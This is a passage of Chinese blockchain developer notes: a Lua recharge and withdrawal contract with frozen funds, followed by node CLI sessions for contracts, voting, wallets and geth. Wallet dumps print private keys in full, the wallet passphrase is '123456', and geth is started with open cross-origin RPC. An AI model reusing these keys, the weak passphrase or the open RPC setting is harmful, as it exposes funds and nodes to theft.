    assert(freeMoney > 0,"freeMoney <= 0")

    local freeMonthMoneyTbl = {}
    freeMonthMoneyTbl = GetValueFromContract(contract, 53, 8)
    local freeMonthMoney = mylib.ByteToInteger(Unpack(freeMonthMoneyTbl))
    assert(freeMonthMoney > 0,"freeMonthMoney <= 0")

    local payMoneyTbl = {}
    payMoneyTbl = {mylib.GetCurTxPayAmount()}
    assert(TableIsNotEmpty(payMoneyTbl),"GetCurTxPayAmount error")
    local payMoney = mylib.ByteToInteger(Unpack(payMoneyTbl))
    assert(payMoney > 0,"payMoney <= 0")

    -- 总金额与充值金额要相等
    assert(money == payMoney, "充值金额不正确1")

    -- 总金额不能小于1,不能小于自由金额或月冻结金额
    if money < 1
        or money < freeMoney
        or money < freeMonthMoney then
        LogPrint(LOG_TYPE.ENUM_STRING, string.len("充值金额不正确2"), "充值金额不正确2");
        error("充值金额不正确2")
    end

    -- 三个金额，上限值检测
    if money >= MAX_MONEY
        or freeMoney >= FREE_MONEY
        or freeMonthMoney >= FREE_MONEY then
        LogPrint(LOG_TYPE.ENUM_STRING, string.len("充值金额不正确3"), "充值金额不正确3");
        error("充值金额不正确3")
    end

    local freezeNum = FREEZE_MONTH_NUM - 1
    assert(freezeNum > 0, "月冻结总数不正确")

    -- 总金额不能小于总的月冻结金额
    local freezeMoney = freeMonthMoney * freezeNum
    if  freezeMoney < freezeNum
        or freezeMoney < freeMoney
        or money < freezeMoney then
        LogPrint(LOG_TYPE.ENUM_STRING, string.len("充值金额不正确4"), "充值金额不正确4");
        error("充值金额不正确4")
    end

    -- 检查充值总金额和自由金额加上冻结金额是否相等
    freezeMoney = freezeMoney + freeMoney
    if money ~= freezeMoney then
        LogPrint(LOG_TYPE.ENUM_STRING, string.len("充值金额不正确5"), "充值金额不正确5");
        error("充值金额不正确5")
    end

    -- 3）
    --操作系统账户的结构
    local writeOutputTbl =
    {
        addrType = 1,       --账户类型 REG_ID = 0x01,BASE_58_ADDR = 0x02,
        accountIdTbl = {},  --account id
        operatorType = 0,   --操作类型
        outHeight = 0,      --超时高度
        moneyTbl = {}       --金额
    }

    writeOutputTbl.addrType = ADDR_TYPE.ENUM_BASE58
    writeOutputTbl.operatorType = OPER_TYPE.ENUM_ADD_FREE
    writeOutputTbl.accountIdTbl = {Unpack(toAddrTbl)}
    writeOutputTbl.moneyTbl = {Unpack(freeMoneyTbl)}
    assert(mylib.WriteOutput(writeOutputTbl),"WriteOutput err1")

    local curHeight = 0
    curHeight = mylib.GetCurRunEnvHeight()

    -- 4）
    local appOperateTbl = {
        operatorType = 0, -- 操作类型
        outHeight = 0,    -- 超时高度
        moneyTbl = {},
        userIdLen = 0,    -- 地址长度
        userIdTbl = {},   -- 地址
        fundTagLen = 0,   -- fund tag len
        fundTagTbl = {}   -- fund tag
    }

    appOperateTbl.operatorType = APP_OPERATOR_TYPE.ENUM_ADD_FREEZED_OP
    appOperateTbl.userIdLen = 34
    appOperateTbl.userIdTbl = toAddrTbl
    appOperateTbl.moneyTbl = freeMonthMoneyTbl

    for i = 1, freezeNum do
      appOperateTbl.outHeight = curHeight + FREEZE_PERIOD * i
      assert(mylib.WriteOutAppOperate(appOperateTbl),"WriteOutAppOperate err1")
    end

    -- 5）
    writeOutputTbl.addrType = ADDR_TYPE.ENUM_REGID
    writeOutputTbl.operatorType = OPER_TYPE.ENUM_MINUS_FREE
    writeOutputTbl.accountIdTbl = {mylib.GetScriptID()}
    assert(mylib.WriteOutput(writeOutputTbl),"WriteOutput err2")

    return true
end

--[[
  功能:操作系统账户
  参数：
    accTbl:账户
    moneyTbl:操作金额
  返回值：
    true:成功
    false:失败
  流程：
    1）增加该系统账户金额
    2）相应地减少脚本账户金额
--]]
function WriteWithdrawal(accTbl,moneyTbl)
    --操作系统账户的结构
    local writeOutputTbl =
    {
        addrType = 1,       --账户类型 REG_ID = 0x01,BASE_58_ADDR = 0x02,
        accountIdTbl = {},  --account id
        operatorType = 0,   --操作类型
        outHeight = 0,      --超时高度
        moneyTbl = {}       --金额
    }
    --执行系统账户提现操作
    assert(TableIsNotEmpty(accTbl),"WriteWithDrawal accTbl invlaid1")
    assert(TableIsNotEmpty(moneyTbl),"WriteWithDrawal moneyTbl invlaid1")

    -- 1）
    writeOutputTbl.addrType = ADDR_TYPE.ENUM_REGID
    writeOutputTbl.operatorType = OPER_TYPE.ENUM_ADD_FREE
    writeOutputTbl.accountIdTbl = {Unpack(accTbl)}
    writeOutputTbl.moneyTbl = {Unpack(moneyTbl)}
    assert(mylib.WriteOutput(writeOutputTbl),"WriteWithDrawal WriteOutput err0")

    -- 2）
    writeOutputTbl.operatorType = OPER_TYPE.ENUM_MINUS_FREE
    writeOutputTbl.accountIdTbl = {mylib.GetScriptID()}
    assert(mylib.WriteOutput(writeOutputTbl),"WriteWithDrawal WriteOutput err1")

    return true
end

--[[
  功能:提现
  参数：
    addrType:账户类型，BASE58或REGID
  返回值：
    true:成功
    false:失败
  流程：
    1）判断账户类型
    2）获取当前交易账户
    3）获取该账户下的自由金额
    4）减掉该账户下的自由金额
    5）相应的操作系统账户
--]]
function Withdraw(addrType)
    -- 1）
    if addrType ~= ADDR_TYPE.ENUM_REGID and addrType ~= ADDR_TYPE.ENUM_BASE58 then
        error("In function Withdraw, addr type err")
    end

    -- 2）
    local accountTbl = {0, 0, 0, 0, 0, 0}
    accountTbl = {mylib.GetCurTxAccount()}
    assert(TableIsNotEmpty(accountTbl),"GetCurTxAccount error")

    local idTbl =
    {
        idLen = 0,
        idValueTbl = {}
    }
    if addrType == ADDR_TYPE.ENUM_REGID then
        idTbl.idLen = 6
        idTbl.idValueTbl = accountTbl
    else
        local base58Addr = {}
        base58Addr = {mylib.GetBase58Addr(Unpack(accountTbl))}
        assert(TableIsNotEmpty(base58Addr),"GetBase58Addr error")
        idTbl.idLen = 34
        idTbl.idValueTbl = base58Addr
    end

    -- 3）
    local freeMoneyTbl = {mylib.GetUserAppAccValue(idTbl)}
    assert(TableIsNotEmpty(freeMoneyTbl),"GetUserAppAccValue error")
    local freeMoney = mylib.ByteToInteger(Unpack(freeMoneyTbl))

    assert(freeMoney > 0,"Account balance is 0.")

    -- 4）
    local appOperateTbl = {
        operatorType = 0, -- 操作类型
        outHeight = 0,    -- 超时高度
        moneyTbl = {},
        userIdLen = 0,    -- 地址长度
        userIdTbl = {},   -- 地址
        fundTagLen = 0,   -- fund tag len
        fundTagTbl = {}   -- fund tag
    }

    appOperateTbl.operatorType = APP_OPERATOR_TYPE.ENUM_SUB_FREE_OP
    appOperateTbl.userIdLen = idTbl.idLen
    appOperateTbl.userIdTbl = idTbl.idValueTbl
    appOperateTbl.moneyTbl = freeMoneyTbl

    assert(mylib.WriteOutAppOperate(appOperateTbl),"WriteOutAppOperate err1")

    -- 5）
    assert(WriteWithdrawal(accountTbl, freeMoneyTbl), "WriteWithdrawal err")
    return true
end


function Main()
  --[[
  local i = 1

  for i = 1,#contract do
    print("contract")
    print("  ",i,(contract[i]))
  end
  --]]

  assert(#contract >= 2,"contract length err.")
  assert(contract[1] == 0xff,"Contract identification error.")

  if contract[2] == TX_TYPE.TX_RECHARGE then
    assert(#contract == 60,"recharge contract length err.")
    Recharge()
  elseif contract[2] ==  TX_TYPE.TX_WITHDRAW then
    assert(#contract == 11,"withdraw contract length err.")
    Withdraw(contract[3])
  else
    error("RUN_SCRIPT_DATA_ERR")
  end

end

Main()
```

##### 注册合约

> **脚本注册 ID：**117-1

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. registerapptx wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC ./test.lua 110000000 0 "test"
{
    "hash" : "86be10a230fb77fb2fc9ad150f06e5a0b34c4bddd84dae13178b79a71dbebd24"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getscriptid 86be10a230fb77fb2fc9ad150f06e5a0b34c4bddd84dae13178b79a71dbebd24
{
    "regid:" : "117-1",
    "script" : "750000000100"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC
{
    "balance" : 998.89900000
}
```

> 通过 `getappinfo()` 接口，根据 `regid` 反向查询合约内容，字段 `scriptContent` 即为合约的十六进制显示

```bash
root@iZwz9iz7dge6lus7u0uvuzZ:~/node1# ./node1 -datadir=. getappinfo "17130-1"
{
    "scriptId" : "17130-1",
    "scriptId2" : "ea4200000100",
    "description" : "7265636f7264",
    "scriptContent" : "..."
}
```

#### 充值

> 合约中，包含总金额、自由余额、每月冻结金额。（初始）自由金额实时转移到合约接收方账户，每月冻结金额将逐步解冻，变成自有金额，并转移到合约接收方账户。

> 解冻逻辑：执行合约后，可以看到如下信息

```bash
"vFreezedFund" : [
        {
            "value" : 500000000,
            "nHeight" : 538,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 543,
            "vTag" : ""
        }
]
```

> 当有新的区块加入时，检查当前区块高度是否大于等于合约中冻结金额的 `nHeight`，如果是，将该比冻结金额解冻，变成自有金额，并转移到合约接收方账户。
>
> 同时，可以借助于出块的速度，设置达到多少块高度某笔金额解冻，实现合约冻结解冻逻辑。

##### 计算合约内容

> 合约内容 = 前缀 1 字节 `0xff` + 操作类型 1 字节 `0x02` + 充值地址 34 字节`whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1` + 充值总金额 8 字节 `10000000000` + 自由金额 8 字节`500000000` + 每月冻结金额 8 字节 `500000000`

1. 合约前缀、操作类型转换为 16 进制

   前缀 `0xff` => `ff`

   操作类型 `0x02` => `02`

2. 充值地址 `whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1` => `77686d44344d3851387162457836523567554c626362355a6b656462635244475931`

3. 充值总金额 `10000000000` => 利用计算器转成 16 进制为 `2540be400`，补齐 8 字节后为 `00000002540be400`，按照内存中逆序后为 `00e40b5402000000`

4. 自由金额 `500000000` => 利用计算器转成 16 进制为 `1dcd6500`，补齐 8 字节后为 `000000001dcd6500`，按照内存中逆序后为 `0065cd1d00000000`

5. 每月冻结金额 `500000000` => 利用计算器转成 16 进制为 `1dcd6500`，补齐 8 字节后为 `000000001dcd6500`，按照内存中逆序后为 `0065cd1d00000000`
6. 将这些字段组合在一起，形成合约内容`ff0277686d44344d3851387162457836523567554c626362355a6b65646263524447593100e40b54020000000065cd1d000000000065cd1d00000000`

##### 充值

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. createcontracttx wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC 117-1 10000000000 ff0277686d44344d3851387162457836523567554c626362355a6b65646263524447593100e40b54020000000065cd1d000000000065cd1d00000000 100000 0
{
    "hash" : "03539043b83e808a867db1d44a4543ced623454a52c5058bfb5d037df7fd5295"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC
{
    "balance" : 898.89800000
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "balance" : 1004.99900000
}
```

##### 查询应用账户信息

- 时间点 1，查看应用账户信息

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getblockcount
534
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getappaccinfo 117-1 whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "mAccUserID" : "77686d44344d3851387162457836523567554c626362355a6b656462635244475931",
    "FreeValues" : 2500000000,
    "vFreezedFund" : [
        {
            "value" : 500000000,
            "nHeight" : 538,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 543,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 548,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 553,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 558,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 563,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 568,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 573,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 578,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 583,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 588,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 593,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 598,
            "vTag" : ""
        },
        {
            "value" : 500000000,
            "nHeight" : 603,
            "vTag" : ""
        }
    ]
}
```

- 时间点 2，查看应用账户信息

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getblockcount
615
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getappaccinfo 117-1 whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "mAccUserID" : "77686d44344d3851387162457836523567554c626362355a6b656462635244475931",
    "FreeValues" : 9500000000,
    "vFreezedFund" : [
    ]
}
```

#### 提现

##### 查看当前余额

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "balance" : 1004.99900000
}
```

##### 提现

将自由金额 `500000000`，提现到地址 `whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1`

合约内容 = 前缀 1 字节 `0xff` + 操作类型 1 字节 `0x01` + 账户类型 1 字节 `0x02` + 提现金额 8 字节 `500000000`

1. 合约前缀、操作类型转换为 16 进制

   前缀 `0xff` => `ff`

   操作类型 `0x02` => `01`

2. 账户类型 `0x02` => `02`

3. 提现金额 `500000000` => 利用计算器转成 16 进制为 `1dcd6500`，补齐 8 字节后为 `000000001dcd6500`，按照内存中逆序后为 `0065cd1d00000000`
4. 将这些字段组合在一起，形成合约内容 `ff01020065cd1d00000000`

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. createcontracttx whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1 117-1 0 ff01020065cd1d00000000 100000 0
{
    "hash" : "502ed951f0e88f8e25d71e0332c315e837b72c390194cd0d64f2be49c75578a2"
}
```

##### 再次查看当前余额

> `1004.99900000 + 95.00000000 - 0.00100000 = 1099.99800000`
>
> **备注：**参数指定提取自由余额 `5.00000000`，实际上，一次性将所有自由余额 `95.00000000` 全部提取

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "balance" : 1099.99800000
}
```

#### 图示余额变化

![](pic/blockchain/free_values.png)

#### 脚本出错处理

当应用账户余额为零时，提现操作将会失败，实现信息已 json 格式输出，具体如下所示：

```bash
root@ubuntu:~/chaincode/tmp/node1# ./node1 -datadir=. getappaccinfo 117-1 whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "mAccUserID" : "77686d44344d3851387162457836523567554c626362355a6b656462635244475931",
    "FreeValues" : 0,
    "vFreezedFund" : [
    ]
}
root@ubuntu:~/chaincode/tmp/node1# ./node1 -datadir=. createcontracttx whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1 117-1 0 ff01020065cd1d00000000 100000 0
error: {"code":-4,"message":"Error:run-script-error:luaL_loadbuffer fail:[string \"line\"]:375: Account balance is 0.\n"}
```

###  智能坊综合操作

#### DPoS

- 查询投票节点信息

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. getdelegatelist 11
{
    "delegates" : [
        {
            "Address" : "wNDue1jHcgRSioSDL4o1AzXz3D72gCMkP6",
            "KeyID" : "1c758724cc60db35dd387bcf619a478ec3c065f2",
            "RegID" : "0-2",
            "PublicKey" : "0376de6a21f63c35a053c849a339598016a0261d6bdc5567adeda0af78b750c4cc",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wNuJM44FPC5NxearNLP98pg295VqP7hsqu",
            "KeyID" : "23e8b4ac5e3dea621474cad9d9dc4323018856c9",
            "RegID" : "0-3",
            "PublicKey" : "025a37cb6ec9f63bb17e562865e006f0bafa9afbd8a846bd87fc8ff9e35db1252e",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wP64X59EoRmeq2M5GrJ23UVttE9uxnuoFa",
            "KeyID" : "25f1bd29a3d025fb7e2aa596d86c41e245ddb2c0",
            "RegID" : "0-4",
            "PublicKey" : "03f52925f191c77bb1d16b19387bcfcb83380f1622d643a11038cf4867c4578696",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wQewSbKL5kAfpwnrivSiCcaiFffgNva4uB",
            "KeyID" : "3721af044c38b62b14b18a78339638097d57d830",
            "RegID" : "0-5",
            "PublicKey" : "0378f1d7ce11bace8bbf28e124cd15f1bc82d7e8a25f62713f812201e1cf8060d8",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wQquTWgzNzLtjUV4Du57p9YAEGdKvgXs9t",
            "KeyID" : "39349a5c128882c0fc6034768b95ad8791b213e7",
            "RegID" : "0-6",
            "PublicKey" : "03fb1fe453bf830843fd90f0d2ae1b67011c168a0a5f2160e41f1d86a64c86c25c",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wRQwgYkPNe1oX9Ts3cfuQ4KerqiV2e8gqM",
            "KeyID" : "3f742fd45c7aea013ff97a07574576ed9048819c",
            "RegID" : "0-7",
            "PublicKey" : "0282464694b94780b88c5e88ff64a7e24800590d4061b90f334067d15643604057",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wSjMDgKWHC2MzrUamhJtyyR2FTtw8oMUfx",
            "KeyID" : "4de772892db26d235febe1f6c004e138fb08206c",
            "RegID" : "0-8",
            "PublicKey" : "02361884b20bdb2f751c56783a5fdc01ec64e25d77b7bf5a30409aef4b5b3b44ce",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wSms4pZnNe7bxjouLxUXQLowc7JqtNps94",
            "KeyID" : "4e6131d0301855593319ad2d00062fc1c95235f9",
            "RegID" : "0-9",
            "PublicKey" : "029699e9b4d679d04d8961bf64ffc0b5ec6f9d46e88bbdcbc6d0a02ce1e4991c0c",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wT75mYY9C8xgqVgXquBmEfRmAXPDpJHU62",
            "KeyID" : "5203b378d7f1b2b9b451bc47742f4a9d96624583",
            "RegID" : "0-10",
            "PublicKey" : "024af74c1cc6b1d729b038427ce9011627f6b816e77699421a85265c4ae0b74b5b",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wUt89R4bjD3Ca6Vb7mk18oGsVtSTCxJu2q",
            "KeyID" : "658087881805a66c7faeb7b942d1930d9bdc72f1",
            "RegID" : "0-11",
            "PublicKey" : "03e44dcf2df8ec33a17c63a894f3697ed863b2d1fcc7b5fd37cc4fc2edf8e7ed71",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        },
        {
            "Address" : "wVTUdfEaeAAVSuXKrmMyqQXH5j5Z9oGmTt",
            "KeyID" : "6bcf5b9a38cb8ca656b5c194f2f3c155be93b3ab",
            "RegID" : "0-12",
            "PublicKey" : "03ff9fb0c58b6097bc944592faee68fbdb2d1c5cd901f6eae9198bd8b31a1e6f5e",
            "MinerPKey" : "",
            "Balance" : 0,
            "Votes" : 21000000000000000,
            "UpdateHeight" : 0,
            "voteFundList" : [
            ]
        }
    ]
}
```

- 创建投票交易

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. createdelegatetx "wgd6Fs7d9ktJVUMv6qdwMup8tqe5ek7dj1" "[{\"delegate\": \"wgd6Fs7d9ktJVUMv6qdwMup8tqe5ek7dj1\", \"votes\": 10000}]" 100
{
    "hash" : "ac8b97c6a68d1048f271ac6091dc867336394c78f73aa8178ea8674385beaf7f"
}
```

- 创建原始投票交易

> 创建投票原始交易不包含签名，需要经过签名之后，再提交交易（广播到网络），即，包含如下三个步骤
>
> `createdelegatetxraw` `->` `sigstr` `->` `submittx`

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=./ createdelegatetxraw wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4 
"[{\"delegate\":\"wVTUdfEaeAAVSuXKrmMyqQXH5j5Z9oGmTt\", \"votes\":1000000000}]" 1000
"[{\"delegate\":\"wNDue1jHcgRSioSDL4o1AzXz3D72gCMkP6\", \"votes\":100000000}]" 1000

{
    "rawtx" : "06013b02000101012103ff9fb0c58b6097bc944592faee68fbdb2d1c5cd901f6eae9198bd8b31a1e6f5e82dbea9300866800"
}
```

- 对原始投票交易签名

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. sigstr 06013b02000101012103ff9fb0c58b6097bc944592faee68fbdb2d1c5cd901f6eae9198bd8b31a1e6f5e82dbea9300866800 wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4
{
    "rawtx" : "06013b02000101012103ff9fb0c58b6097bc944592faee68fbdb2d1c5cd901f6eae9198bd8b31a1e6f5e82dbea9300866846304402205f6466af52af2674712860d45c70a6c8f1f74fdc55b93b67997021729eda147b022015fa2ee2c41822baf00e36aeb26e3ac20a1cb444f6b3cf4934e863525114c124"
}
```

- 提交经过签名的原始投票交易

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. submittx "06013b02000101012103ff9fb0c58b6097bc944592faee68fbdb2d1c5cd901f6eae9198bd8b31a1e6f5e82dbea9300866846304402205f6466af52af2674712860d45c70a6c8f1f74fdc55b93b67997021729eda147b022015fa2ee2c41822baf00e36aeb26e3ac20a1cb444f6b3cf4934e863525114c124"
{
    "hash" : "41f5a496fc22d97ff406d391c884a85ef8fe57ccf1d1ab4859c0469592ab2497"
}
```

#### 钱包

- 钱包设置口令

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. encryptwallet "123456"
{
    "encrypt" : true
}
```

- 解锁钱包

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. walletpassphrase "123456" 100
{
    "passphrase" : true
}
```

- 锁定钱包

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. walletlock
{
    "walletlock" : true
}
```

- 导出钱包

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. dumpwallet "wallet.dat"
{
    "info" : "dump ok",
    "key size" : 4
}
root@ubuntu:~/chaincode/node/node1# cat wallet.dat
{
    "created by Coin" : "v1.0.0.9-unk-release-linuxSep 14 2018, 11:27:50",
    "Created Time " : "2018-09-25T07:24:14Z",
    "Best block index hight " : 524,
    "Best block hash " : "139518cdce961dc3f861be019748ab0c8f26ac8427ffd89eca61b85806237443",
    "key" : [
        {
            "address" : "wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4",
            "mCkey" : "2d9a6bd47cf56860856f453c4b472494c25db3c1484b9b3065679fc0351fd2dd",
            "mCkeyBase58" : "Y6J4aK6Wcs4A3Ex4HXdfjJ6ZsHpNZfjaS4B9w7xqEnmFEYMqQd13",
            "mMainPk" : "036c5397f3227a1e209952829d249b7ad0f615e43b763ac15e3a6f52627a10df21",
            "nCreationTime" : 1537854811,
            "keyid" : "079b9296a00a2b655787fa90e66ec3cde4bf1c8c"
        },
        {
            "address" : "wM6rWHMWrX2gpvsT4dVBXgsLnC2Xu7q1u5",
            "mCkey" : "c54b3d60ce152f58aa9f7ece03b26d9d00e528e72c046efd19aaf28e25354da1",
            "mCkeyBase58" : "YBNvrYUNYDo2m2YcidQ2XazwyygPEuDiJFNhTAkEwGVgHCYPtM2q",
            "mMainPk" : "024074f8938403273f9f6016bdc18c117ec9d306df6eb9256bea4d6ce99a339f97",
            "nCreationTime" : 1537854806,
            "keyid" : "1027dff66105914ca76477948caaa76570c3db2c"
        },
        {
            "address" : "wNDue1jHcgRSioSDL4o1AzXz3D72gCMkP6",
            "mCkey" : "0e33bc16fc761cc5d244ebb3ff08724519915340ae69a13741ea0ee6f179ecc5",
            "mCkeyBase58" : "Y5F2GraTdQqMbYrV6MG78Kbg4QE8p4B2DyxMdLMH7HmDNtiNmcbM",
            "mMainPk" : "0376de6a21f63c35a053c849a339598016a0261d6bdc5567adeda0af78b750c4cc",
            "nCreationTime" : 1537854811,
            "keyid" : "1c758724cc60db35dd387bcf619a478ec3c065f2"
        },
        {
            "address" : "wT1HrN6x9gFEbvvZvgD4GH8Baoa8fdeuR7",
            "mCkey" : "2679dc5759ce94f93c8934e0849407954ef14a331e3f74a7660c3e1696409458",
            "mCkeyBase58" : "Y64D2N3HVz4Scwyq9U3Ry6R3TKzmB1ZgT7dgN2h13pTyXRLomBay",
            "mMainPk" : "02656c20d5acd60ece211a5a0a6834cde3842c7e1943ba0c6277c66d0ae7bd3462",
            "mMinerCkey" : "77666e5d556052f2d2b0d73545b16d49129eaae03a5af4cee94e779fdd251d71",
            "mMinerCkeyBase58" : "Y8mWmMFVMfGNr3CjGoQFwLinWKJZmz4WHTMQv9Y4mvEKZ8Gcy5nv",
            "mMinerPk" : "03f71e5a25f8fdf95296391d8b48f580ebb0e00b57f23c2fcef7c84b680ad9edeb",
            "nCreationTime" : 1537855826,
            "keyid" : "50eb4ab0cb320415a43a2ae11fbe901c7261f701"
        }
    ]
}
```

#### 私钥

- 导出私钥

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. dumpprivkey wT1HrN6x9gFEbvvZvgD4GH8Baoa8fdeuR7
{
    "privkey" : "Y64D2N3HVz4Scwyq9U3Ry6R3TKzmB1ZgT7dgN2h13pTyXRLomBay",
    "minerkey" : "Y8mWmMFVMfGNr3CjGoQFwLinWKJZmz4WHTMQv9Y4mvEKZ8Gcy5nv"
}
```

- 删除私钥

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. dropprivkey
{
    "info" : "wallet is ready for cool miner"
}
```

> 删除私钥之后，如果尝试导出一个不存在的私钥，将提示如下错误

```bash
root@ubuntu:~/chaincode/node/node1# ./node1 -datadir=. dumpprivkey wVueyLZYPHkKWizQ3uPyEdH2MnsmMe8Aew
error: {"code":-4,"message":"Private key for address wVueyLZYPHkKWizQ3uPyEdH2MnsmMe8Aew is not known"}
```

#### 节点

- 获取节点信息

```bash
root@ubuntu:~/WaykiChain/node/node0# ./node0 -datadir=. getpeerinfo
[
    {
        "addr" : "127.0.0.1:7903",
        "services" : "00000001",
        "lastsend" : 1541557080,
        "lastrecv" : 1541557080,
        "bytessent" : 64123,
        "bytesrecv" : 27285,
        "conntime" : 1541556982,
        "pingtime" : 0.00000000,
        "version" : 10001,
        "subver" : "/waykichain:1.0.0.1:linux/",
        "inbound" : false,
        "startingheight" : 106,
        "banscore" : 0,
        "syncnode" : true
    }
]
```

- 获取连接数

```bash
root@ubuntu:~/WaykiChain/node/node0# ./coind -datadir=. getconnectioncount
1
```

- 手动添加节点

给节点添加 `127.0.0.1:7901` 的节点

```bash
root@ubuntu:~/WaykiChain/node2# ./coind -datadir=. addnode "127.0.0.1:7901" add
```

### 以太坊初步探索

> Ubuntu 14.04.5 LTS/geth v1.8.13-unstable/solc v0.4.24+commit.e67f0147.Linux.g++/golang v1.10.3

#### 启动 geth

**开发者网络**

`./geth --datadir="./devdata" --dev --rpc --rpccorsdomain "*" console`

> 上述命令即启动了一个节点服务，同时启动了一个控制台。实际上，可以独立启动节点服务，即，`./geth --datadir="./devdata" --dev --rpc --rpccorsdomain "*"`

> 需要启动控制台的时候，执行 `./geth attach http://localhost:8545` 或 `./geth attach ./testnet/geth.ipc`

```bash
root@~/eth# ./geth attach ./testnet/geth.ipc
Welcome to the Geth JavaScript console!

instance: Geth/v1.8.13-unstable-040dd5bd/linux-amd64/go1.10.3
coinbase: 0x96d81d81149a3a8501eb99fb8aca1cff5cc19d7c
at block: 4245054 (Tue, 16 Oct 2018 11:54:45 CST)
 datadir: /root/eth/testnet
 modules: admin:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 txpool:1.0 web3:1.0

> eth.getBalance(eth.accounts[0])
146513139948307702333
> exit
root@~/eth#
```

**以太坊正式网络**

`./geth --syncmode "fast" --cache=512 --datadir="./data" --rpc --rpccorsdomain "*" console`

**以太坊测试网络**

`./geth --syncmode "fast" --datadir="./testnet" --testnet  --mine --minerthreads=2 --cache=1024 --rpc --rpccorsdomain "*" console`

**以太坊私有网络**

配置创世块配置文件 `genesis.json `

> 配置自己的创世块是为了区分公有链，同一个网络中，创世块必须是一样的，否则无法联通。

```json
{
  "config": {
        "chainId": 10,
        "homesteadBlock": 0,
        "eip155Block": 0,
        "eip158Block": 0
    },
  "alloc"      : {},
  "coinbase"   : "0x0000000000000000000000000000000000000000",
